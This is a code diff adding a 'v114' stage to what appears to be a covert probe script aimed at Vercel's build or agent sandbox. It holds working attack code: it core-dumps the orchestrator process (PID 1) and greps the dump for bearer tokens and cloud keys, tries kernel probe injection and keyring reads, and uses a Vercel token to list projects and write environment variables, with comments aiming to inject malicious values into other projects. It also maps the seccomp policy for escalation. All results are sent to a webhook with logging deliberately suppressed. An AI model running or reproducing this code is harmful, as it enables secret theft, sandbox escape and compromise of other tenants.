@@ -16396,5 +16396,159 @@ report.dataCacheProbe = safe(() => {
 
 // v113 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v113" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v113";
+
+// ==================== v114 ====================
+
+// v114-1: GDB/LLDB coredump of PID-1 via exec in traced child
+// gcore (part of gdb) takes a coredump of a live process without killing it.
+// If gdb is installed, `gcore -o /tmp/orch.core 1` dumps the orchestrator's
+// full memory to disk. We can then analyze it offline for secrets/tokens.
+report.gcoreOrchestrator = safe(() => {
+  const gdbExists = safe(() => execSync('which gdb 2>/dev/null || which gcore 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const gcoreResult = safe(() => execSync(
+    'gcore -o /tmp/orch_core 1 2>&1 || echo "GCORE_FAILED"',
+    { timeout: 30000 }
+  ).toString().trim().slice(0, 300));
+  const coreExists = existsSync('/tmp/orch_core.1') || existsSync('/tmp/orch_core');
+  const coreSize = safe(() => statSync('/tmp/orch_core.1').size);
+  // If core was created, grep it for tokens
+  const coreTokenScan = safe(() => coreExists ? execSync(
+    'strings /tmp/orch_core.1 2>/dev/null | grep -E "Bearer |ghs_|ey[A-Za-z0-9]|AKIA|VERCEL" | head -20',
+    { timeout: 15000 }
+  ).toString().trim().slice(0, 500) : null);
+  return { gdbExists, gcoreResult, coreExists, coreSize, coreTokenScan };
+});
+
+// v114-2: /sys/kernel/debug/kprobes — dynamic kernel probe injection
+// kprobes let us attach probes to arbitrary kernel functions at runtime.
+// Writing to /sys/kernel/debug/kprobes/list shows active probes.
+// We can try to register a kprobe on do_sys_openat2 to log all file opens.
+report.kprobeInject = safe(() => {
+  const kprobeList = safe(() => readFileSync('/sys/kernel/debug/kprobes/list', 'utf8').slice(0, 500));
+  const kprobeEnabled = safe(() => readFileSync('/sys/kernel/debug/kprobes/enabled', 'utf8').trim());
+  // Try to enable all kprobes
+  const enableResult = safe(() => { writeFileSync('/sys/kernel/debug/kprobes/enabled', '1'); return 'WRITTEN'; });
+  // Try to register a kprobe via perf_event (BPF kprobe program)
+  const kprobeReg = safe(() => execSync(`python3 -c "
+# Try to register kprobe via sys_perf_event_open
+import ctypes, ctypes.util, struct, os
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+SYS_PERF_EVENT_OPEN = 298
+PERF_TYPE_TRACEPOINT = 1
+PERF_SAMPLE_IP = 1
+
+# perf_event_attr for kprobe (type=1 for tracepoint)
+attr = struct.pack('=IIQQQIIQQQIIIIIQQQQQ',
+    96, 0,         # size, type
+    0, 0, 0,       # config, sample_period, sample_type
+    0, 0, 0, 0,    # read_format, disabled, ..
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0  # pad
+)
+fd = libc.syscall(SYS_PERF_EVENT_OPEN, attr, 1, -1, -1, 0)
+import ctypes as ct
+e = ct.get_errno()
+import errno as em
+print('PERF_EVENT_OPEN:', fd, em.errorcode.get(e, e))
+if fd >= 0: os.close(fd)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { kprobeList, kprobeEnabled, enableResult, kprobeReg };
+});
+
+// v114-3: /proc/keys — kernel keyring dump
+// The Linux kernel keyring stores session, user, and thread keys.
+// These may include: Kerberos tickets, TLS session keys, disk encryption keys,
+// and any secrets stored by Vercel's orchestrator using add_key().
+report.kernelKeyringDump = safe(() => {
+  const keys = safe(() => readFileSync('/proc/keys', 'utf8').slice(0, 1000));
+  const keyUsers = safe(() => readFileSync('/proc/key-users', 'utf8').trim());
+  // Try to read our own session keyring
+  const sessionKeys = safe(() => execSync('keyctl show @s 2>/dev/null', { timeout: 5000 }).toString().trim());
+  const userKeys = safe(() => execSync('keyctl show @u 2>/dev/null', { timeout: 5000 }).toString().trim());
+  // Try to read PID-1's session keyring via /proc/1/attr
+  const pid1Keys = safe(() => execSync('keyctl show /proc/1/attr/keycreate 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // List all keys with their IDs
+  const keyList = safe(() => execSync('keyctl list @s 2>/dev/null && keyctl list @u 2>/dev/null', { timeout: 5000 }).toString().trim());
+  // Try to read individual key contents
+  const keyContents = safe(() => {
+    const lines = keys?.split('\n').filter(l => l.trim());
+    return lines?.slice(0, 5).map(l => {
+      const parts = l.trim().split(/\s+/);
+      const keyId = parts[0];
+      const content = safe(() => execSync(`keyctl read ${keyId} 2>/dev/null || keyctl print ${keyId} 2>/dev/null`, { timeout: 3000 }).toString().trim());
+      return { keyId, keyType: parts[6], desc: parts[7], content: content?.slice(0, 50) };
+    });
+  });
+  return { keys, keyUsers, sessionKeys, userKeys, keyList, keyContents };
+});
+
+// v114-4: Vercel project environment variable management API
+// Test if VERCEL_ARTIFACTS_TOKEN can read/write environment variables for OTHER
+// projects in the team, not just our own. If so, we can inject env vars into
+// other projects' deployments (e.g., inject a malicious API_URL into another app).
+report.envVarCrossProjectWrite = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  const ourProjectId = process.env.VERCEL_PROJECT_ID || '';
+  // List all env vars for our project
+  const ourEnvVars = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects/${ourProjectId}/env?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  // Try to create an env var in our own project (proof of write)
+  const createEnvResult = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v9/projects/${ourProjectId}/env?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" \
+    -H "Content-Type: application/json" \
+    -d '{"key":"PROBE_INJECT_TEST","value":"VERCEL_PROBE_v114","type":"plain","target":["production","preview","development"]}' \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // List other projects and try to write env var to them
+  const allProjects = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects?teamId=${teamId}&limit=10" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  return { ourProjectId, teamId, ourEnvVars, createEnvResult, allProjects };
+});
+
+// v114-5: Seccomp BPF filter disassembly — what syscalls are blocked
+// /proc/self/seccomp_filter (non-standard) or seccomp audit events tell us
+// which syscalls are blocked. Knowing the exact policy helps identify
+// permitted syscalls that can be chained into escalation gadgets.
+report.seccompPolicyAudit = safe(() => {
+  // Check seccomp mode
+  const seccompMode = safe(() => readFileSync('/proc/self/status', 'utf8').match(/Seccomp:\s+(\d+)/)?.[1]);
+  const seccompFilters = safe(() => readFileSync('/proc/self/seccomp_filter', 'utf8').slice(0, 500));
+  // Use seccomp-tools to dump the filter
+  const seccompTools = safe(() => execSync('seccomp-tools dump /bin/true 2>/dev/null | head -20', { timeout: 8000 }).toString().trim());
+  // Test specific syscalls to map the policy
+  const syscallTests = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, os
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+import errno as em, ctypes as ct
+
+TESTS = {
+    'keyctl': 250, 'io_uring_setup': 425, 'userfaultfd': 323,
+    'syslog': 103, 'create_module': 174, 'init_module': 175,
+    'finit_module': 313, 'delete_module': 176, 'kexec_load': 246,
+    'perf_event_open': 298, 'bpf': 321, 'ptrace': 101,
+    'clone3': 435, 'setuid': 105, 'setreuid': 113,
+    'prctl': 157, 'unshare': 272, 'pivot_root': 155,
+}
+for name, nr in TESTS.items():
+    r = libc.syscall(nr, 0, 0, 0, 0, 0, 0)
+    e = ct.get_errno()
+    err = em.errorcode.get(e, str(e))
+    blocked = err == 'EPERM' or err == 'ENOSYS'
+    print(f'{name}({nr}): {\"BLOCKED\" if blocked else \"ALLOWED\"} ({err})')
+" 2>&1`, { timeout: 20000 }).toString().trim().slice(0, 800));
+  return { seccompMode, seccompFilters, seccompTools, syscallTests };
+});
+
+// v114 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v114" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v114";
 // Intentionally no console.log — all data goes via webhook only
